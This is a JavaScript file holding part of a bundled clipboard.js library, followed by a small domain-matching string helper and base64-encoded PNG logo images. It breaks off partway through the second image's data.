  var clipboard_createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

  function clipboard_classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

  function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

  function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }





  /**
   * Base class which takes one or more elements, adds event listeners to them,
   * and instantiates a new `ClipboardAction` on each click.
   */

  var clipboard_Clipboard = function (_Emitter) {
      _inherits(Clipboard, _Emitter);

      /**
       * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
       * @param {Object} options
       */
      function Clipboard(trigger, options) {
          clipboard_classCallCheck(this, Clipboard);

          var _this = _possibleConstructorReturn(this, (Clipboard.__proto__ || Object.getPrototypeOf(Clipboard)).call(this));

          _this.resolveOptions(options);
          _this.listenClick(trigger);
          return _this;
      }

      /**
       * Defines if attributes would be resolved using internal setter functions
       * or custom functions that were passed in the constructor.
       * @param {Object} options
       */


      clipboard_createClass(Clipboard, [{
          key: 'resolveOptions',
          value: function resolveOptions() {
              var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

              this.action = typeof options.action === 'function' ? options.action : this.defaultAction;
              this.target = typeof options.target === 'function' ? options.target : this.defaultTarget;
              this.text = typeof options.text === 'function' ? options.text : this.defaultText;
              this.container = clipboard_typeof(options.container) === 'object' ? options.container : document.body;
          }

          /**
           * Adds a click event listener to the passed trigger.
           * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
           */

      }, {
          key: 'listenClick',
          value: function listenClick(trigger) {
              var _this2 = this;

              this.listener = listen_default()(trigger, 'click', function (e) {
                  return _this2.onClick(e);
              });
          }

          /**
           * Defines a new `ClipboardAction` on each click event.
           * @param {Event} e
           */

      }, {
          key: 'onClick',
          value: function onClick(e) {
              var trigger = e.delegateTarget || e.currentTarget;

              if (this.clipboardAction) {
                  this.clipboardAction = null;
              }

              this.clipboardAction = new clipboard_action({
                  action: this.action(trigger),
                  target: this.target(trigger),
                  text: this.text(trigger),
                  container: this.container,
                  trigger: trigger,
                  emitter: this
              });
          }

          /**
           * Default `action` lookup function.
           * @param {Element} trigger
           */

      }, {
          key: 'defaultAction',
          value: function defaultAction(trigger) {
              return getAttributeValue('action', trigger);
          }

          /**
           * Default `target` lookup function.
           * @param {Element} trigger
           */

      }, {
          key: 'defaultTarget',
          value: function defaultTarget(trigger) {
              var selector = getAttributeValue('target', trigger);

              if (selector) {
                  return document.querySelector(selector);
              }
          }

          /**
           * Returns the support of the given action, or all actions if no action is
           * given.
           * @param {String} [action]
           */

      }, {
          key: 'defaultText',


          /**
           * Default `text` lookup function.
           * @param {Element} trigger
           */
          value: function defaultText(trigger) {
              return getAttributeValue('text', trigger);
          }

          /**
           * Destroy lifecycle.
           */

      }, {
          key: 'destroy',
          value: function destroy() {
              this.listener.destroy();

              if (this.clipboardAction) {
                  this.clipboardAction.destroy();
                  this.clipboardAction = null;
              }
          }
      }], [{
          key: 'isSupported',
          value: function isSupported() {
              var action = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : ['copy', 'cut'];

              var actions = typeof action === 'string' ? [action] : action;
              var support = !!document.queryCommandSupported;

              actions.forEach(function (action) {
                  support = support && !!document.queryCommandSupported(action);
              });

              return support;
          }
      }]);

      return Clipboard;
  }(tiny_emitter_default.a);

  /**
   * Helper function to retrieve attribute value.
   * @param {String} suffix
   * @param {Element} element
   */


  function getAttributeValue(suffix, element) {
      var attribute = 'data-clipboard-' + suffix;

      if (!element.hasAttribute(attribute)) {
          return;
      }

      return element.getAttribute(attribute);
  }

  /* harmony default export */ var clipboard = __webpack_exports__["default"] = (clipboard_Clipboard);

  /***/ })
  /******/ ])["default"];
  });

//___________________________________________________________________________
String.prototype.isdomain = function(ismatch){const a =new URL(this.valueOf());const {host, hostname, pathname, port, protocol, search, hash} = a;if(hostname.split('.').length>2){ var mainhostname = `${hostname}`.split('.').slice(1).join('.').replace('.','\\.');} else {var mainhostname =`${hostname}`.replace('.','\\.');} return typeof this.indexOf === 'function' && mainhostname.indexOf(ismatch.replace('.','\\.')) === 0;}
window._lfjlang='';
var ilfj_logo='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAACXBIWXMAAC4jAAAuIwF4pT92AAARqElEQVR4nO2de3BVRZrAf50QQhICLmQijgY0CWQclCgqyDOKM7rirIsPnHEtsFZceRRblE6N1uq6lpZVU4ss7OJmcIvdQcWaAUZrAF0fUMhTRIQQQBQly0skCBgIwbxI7rd/nATCndx7z+nue85JzK+qK6l7z+nvu/195+vvnO7TDV100UUXXXTRRRcBISKXB61DFwEgIpeKyO9E5GDQunThIyKSJSLPiUiNOBwLWqcufEBEUkVkqohUysWcCFq3Hyrd/BIkIhOA3wI/aefrFL/0cIuIKGAIcB0wCPgRkAkIUA1UAf8HfAWUK6XqAlI13IjIzSKyUeJzOmg9WxGRYhH5LxH5NoHObakVkbdF5D4R8e2iCjUiMlBE3nTZgGdCoG++iPzZg9Fj8Y2I/FpEsoL+TYEgIrkiUioi5zw02vcB6zxJnKvYJsdF5B9FJC3I3+Yb4mT2z4rIGY3Gqg9Q799aNHp7LAjqt7nBZn/1EVCseW4gSaCIzAZ+k2Qxm5JcvxE2G14ZnJtqTQuXiMh0km/8JuDdJMswwqYDfGdwrq8RQERuAOb7IOojpdQpH+RoExYHQER8cQIR6Q68hj/PQN72QYYRoXEA/OsGpgKDfZK10ic52ti8CkwdIOkRQEQygH9OtpwWvlRK7UtGxSLSF8gFzgKVSqkm3bp+aBHgVzgN5wdWw7+IjBaR/xaR48BJ4HPgMHBKRN4RkdE25eko+LDh/XJPH3TcbKijF8Za0jlfRN51IS8iIr8XkR425Ooo+gvDBuudZP0ua2kkP/hORIwjmojc2lKXFzaKyCVuZXS2LiAV6APk4Yw63gCMBcZu3LhxKmbPKrzwrlKq2aQCERkKvIPze7wwGljk9uCOmgT2BkbgZPMFQGHL3/7E+E179+5lzJgxJvptAhbgJF5DgJ+16NC9nWON+n9xusPlOMPPOkwQkQeVUn800cMTItLXMGxeGqf6PsD9OA9vdgDNOOPyrktZWZmJbhuknWFeEckUkfEiMl9Evmo5tlFEehm25YsmyrbwqYkOOkqniEizgcI/jqoyEydrXwk04sLIffr0kZ49e7b7XXV1tZZSjY2NkaFDh64BfglkJGiDQhG5z7Ad00RvQK09ChLJs9YFKKUi4kzs8NpntdLaBdwAzALuATzdGTz//PPMnDmTqqoqDh48eL4cO3aMXr30LspFixapsrKyccA4nPD/Z+A/gO3RxyqlKoAKLUEXGAFkG9bRyjCcWUv+IBfCoGcefPDBB4HVeAztbcvy5cstXTgXGDRoUCx5q4Bbk9CGsyyq/1Qiebafvmknglu2bPkDTmKlTV5ensnpf8H69ev56quvYn39c+BDYEvL/7b4kcW62ktQLyI0DpCaan4XaNsBrr/+et555x2efPJJbr75Zrp1a7fHHI4TDf4EXGFBbMRCHa2ctFhXYkTkNd1YVVRUpB36AUlPT5dIJLnPec6ePSurV6+WZ599VkpKSqRHjx7RetTgzDHQngYmIv9gUWXrXVQi5efqanr11VcbOUBBQYHFdnNHfX29bNiwQV588UW5/fbbJT09vVWfHcBAzTa8xpJ6NeL3Y2EReUZX22uuucbIAW655RZL7aZHc3Oz9O3bt61OZ3BuHXXaUTuZbsMf3MiynQNU6Z6YkmKmyhVX2Oh+9SkrK+O77y5KgbKBJThPD9M9VjfPUJ164F/cHNhpkkDbCaBXVq1aFeuracAGIMdDdf8DmMwleKblmURCuhzAEh988EG8r4fhjCX0d1OXUqoR5ylog4YqpUqpuW4PDo0DmHYBQTpATU0NH3/8caLDioDNwE/b+1KcuYrnUUqVAX8L1LpUoxl4Sik10+XxQIgcwDQCBJkDrFu3jnPnzrk59HKcSDC87Ycikg8cFZF/lTaLZSilPgBuAtbHqVOA/wWGKqVme9XdqgNcd911l+me25EjQILwH81fAe9x8cTUqUBf4EnggIi8ISLXAyilPldK3dJy/BM4SeVS4GVgBpCnlPqFUmqX6e8w5SrgaF1dndY9y9ixY7VvATMyMizcNekzcOBAHb2PAP1FJF1ETsSoep2I/I04r6onBVsRIBfncehlUbdCrjHpAjIzM1m2bBmbN2/m8OHDbsOxFQ4cOMC+fVoJ++XAqq+//vrviX2HUIIzHL5XRKaLM6s5dGQA22jx7J07d2pdRbfddpvRg6C2RSkl/fr1k/Hjx2vp4oVXXnnFSNfy8nIvY/8nxZks0s+W8WxEgPk4Y/gA0Q9DXGNjMKgVEeHYsWPU1rpNoPWJc/+fkOLiYoqLi72M/fcFngEOicirInKttvAWTB3gIeDRth/oOoBpEtgeRUVFns9pbGxkw4YNNDQkvgVvampizZo1OqoBMH36dN1TuwMP4ySFRpjMCCoCXon+MAwRoBUdB9ixYwclJSX06NGD4cOHU1JSQklJCSNGjCAj4+IueOvWrVRXV2vp1qtXLx566CGtc1sQ4CWTCkDfAdKAZbQzZStMDjBo0CDP53z6qTOXsr6+nvXr17N+vXML3r17d2666abzDjFq1Cij8D9p0iR69jR6F+ZdpdTnJhWY8BQxkponnnhCK5maMGGCtSSwtezbt8+zHpMmTXJVd7du3SQrK0tbt88++0yrndpg5c0jnQiQBzwb68uwRIC0tDSuvPJKz+e1RoBENDU10dSk907m2LFjGTzY6AXlT5RSG0wqaEUn8/p3IOYKWGFJAgsKCmJN4YpJdXU1X375pVU92sMg+WvFuO9vxWur3wHcG++AsEQAnQRw+/btiIhVPaK59NJLuffeuE2YiH04U9Ot4NUBXkh0QFgcQCcB3Lp1q1Ud2mPKlCl0755wsm485iqlrE0c9eIA43DGteMSli5AJwIk2wFSUlJ47LHHTKo4DrxqRxsHL63+T24OOnXqFJGIdwcNQwRwmwDqctdddzFgwACTKv5TKWV1TUW3DnADLl/aiEQinD7tfenfoHOAyspKjhw5YlWHaAyTv++BUkuqnMetA8zyUqlON2CzC7jkkkvIzfW2Ekyyr/78/HzuuOMOkyp+r5TSnnQbCzetnonzoqZrdBzAZgQIYwI4depUEydvBlzP8/OCG43uxuNbukFHgLAlgOnp6TzyyCPa5+/bt2+LUuqgPY0u4KbV/85rpR0tAogI27ZtsyY/mokTJ5KT42VW+MVMnTo1aTNcEjlAH+CvvVYatAN4jQAVFRWcOpW8FV1Nkr81a9awdu3akYDrhZ+8kMgBxqHxomPQXYDXCJDMBLC4uJiRI0dqnz979mxwxv+T8qJnolbXGnEKMgIopRg40Nt7mcns/02u/p07d7YdcrYy+hdNIgfQWlYryAiQl5dHZqa3xbWSFQGys7ONJn289NJFYz6+O0BvnOXQPBNkBPAa/puamigrK7MiO5rJkydrT/o4fPgwS5cubftRMfbWDjpPPAcYkeD7mFRVeX9eYcsBvCaAu3fvpr4+OTvWmIT/efPmRc83SAX0k4kYxDOw9oyFILuAsCSAJpM+Tp06xcKFC9v7qt33Ck2I1+oJ15iLRZBdgNcIkKwE0OTqX7BgAd9/3+5Gato2iUU8ByjUrbS2ttZzWLUVAbw6QDIiQG5urvakj4aGBubPj7mbjbZNYpGUCADeo4CNCNCjRw/693f1Cj7gOOqePXuM5Ubz6KOPak/6eP311/n2229jfe1bBEjF5WIGsQjCAQoLCz1FkrKyMpqbjRb1/gtMJn1EIhHmzJkT75ArsbyxRqzW6o3hMrJeHcBGF+A1AUxG/28y6WPlypXxFqYExyZWbwVjtbrxvrdBRIAwJIAmyV/LY99EWN2TODQOYCMCBJ0AXnXVVdqTPj766CM3y8yAx6H5RITGAWxEAC9dwMmTJ9m/f7+xzLZMmzZN25FdXv3QWSOA312A7fF/k0kfe/fu5e23XW8y4ksEMMbvLqBv37706eN+qwLb/b/JpI85c+Yk/YWUWMRq9XYfQ3nB7wgQdAKom/xVVlayePFiL6ec1RIUg9A4gGkECDIBHDJkiPakj/nz59PY2OjlFGPbtCU0DmAaAbwkgIcOHeL48eNG8toyY8YMrfNqampYsGCB19M6ZwTwswuwefWbTPpYuHChzgojvkSAakB7Q2Lw/oqYaRfgJQLY7P91J32cO3eOefM8Lwp+DmdTCmvEavVmnI2JtfH6iphJBEhJSaGw0P1Amc0IoJv8LVmyROdVtEM4trFGvMvOdPszT92ASQQYMGAA6enuluSPRCLWngGMGTNGe9JH1Hw/txjbJJp4rW6835wXBzCJAF76/y+++IKzZ+3kUbrJ3/vvv8/u3bt1TrW+B2BoIoBfDmAr/JtM+vDw2DcaXyOA8RJkfnUBQSSAupM+tm3bxtq1a3XFfqF7YizitfrHGO5h11kjgMmkD82+H5zkb7PuybGI5wDVgNEa9H45gNsI0NDQwM6dO7XltDJ+/HitSR/79+/nrbfe0hVbjuVbQEg862cDcJ1u5UePHuXYsWPU1dVRW1tLXV3dRf+3/WzXLj1fy8zMdL1bSHl5uZWl5HWTv7lz55pMQduoe6IJ92N59U7bJScnRxYvXizl5eXS0NAQd2nNl19+2Vhefn6+NDc3e17W88SJE5KRkWEi29MiHW5JFAHWAI242IQ4KE6ePMmkSZMA6NatG0VFRQwZMoRrr732/N/WmcI2EsCZM2dqJaylpaXU1dXpim0AtDNHU1YSgivdpPTu3VtGjx4dvbOn55KVlSWnT5/2fPXX1tZKTk6OiWxrC0Pq8KsYSv3gyowZMzwbX0SktLTUVPZEr0azSSZO9hm4AYIsqampUlFR4dn4TU1Nkp+fbyL7DODvJtDt8DohMEKQ5YEHHtC6+pctW2Yq+1XP1koCNxACIwRZtm/fruUAN954o6ls7dtw26wiBIYIotxzzz1axl+7dq2p7Pd0DJUsbiUExvC7pKSkyO7du7Uc4M477zSVn5RlYUzYQgiM4meZMmWKlvF37dplKnuTnomSy88JgVH8Krm5uVJVVaXlAJMnTzaVP07TRknnT4TAOH6UpUuXahn/4MGDkpaWZiL7j9rW8YEr+AE8F5g+fbqW8UVEHn74YRPZZ4Afa1vHJ35DCIyUrDJq1Cipr6/XMv6ePXskJSXFRP7jJobxizRgByEwlu0ybNgwqa6u1r767777bhP52zFcmMNPBuKEq8CNZqOkpaXJrFmzpLa2Vtv4K1asMNGhmiSsAZRsOvxAUUFBgbzwwgty5MgRbcOLiNTU1EheXp6JLvdZsEcgLCAEhtQtCxcuNDJ8K48//riJHjHXhesIpAOfEAJj6pSVK1caG3/16tWilNLVYTMhnnDjlhxgLyEwqNfyySefGBn/+PHj0q9fP135e3A25egU9AeOEAKjeikHDhzQNn4kEjF53n8Y55lKp2IwUEUIDOu2mGT9Tz/9tK7ck8BPLLV56BhOB3GC7OxsbeMvWrTIxPg3WmvtkDKYDtAdFBYWahn/ww8/1H3Wf4hOfOVH05+QJ4YjR470bPyNGzdKdna2jrw9dMI+PxE5hPgW0etMn3Xr1klWVpaOrM10omzfK+nA7wiBwaPLtGnTXBt/1apVkpmZqSNnPp3gPt8GvyRkYwfPPfecK+PPnj1bUlNTvdZ/mg78eDdZDATKCIHxASktLY1r+JqaGrn//vt16t5GBxzY8YtuwK8JwaSSN998s13DRyIReeONN6R///5e6zyDM57fYYZ0g1C0Cfg3YAnOlugPBKAD4KxJUFlZSXNzM9988w0VFRVs2rSJFStWUFlZ6bW6JTiOfdS+pp2bn+FkyYF3CZplEyGewNmRKAHeJ3iDui3vEcJ5+52BocBrhOyOgQt9/KvA9cn68V1cIAMnP1iOs0BCUEavx3k/fyIheEvXNipoBVxyCc6raWNbSjGWt09rQzPOgkwbcdZIWotzT98p6SgOEE02zkbKP8W53y5s+Xsl7u9szuEMzlTgrMBZgbMO32aSsBpXWOmoDhCLVBznyMLZW6f1Lzjr7H/f5m8Nlhde7qKLLrroWPw/aqWS8RIQUXMAAAAASUVORK5CYII=';
var blfj_logo='data:image/png;base64,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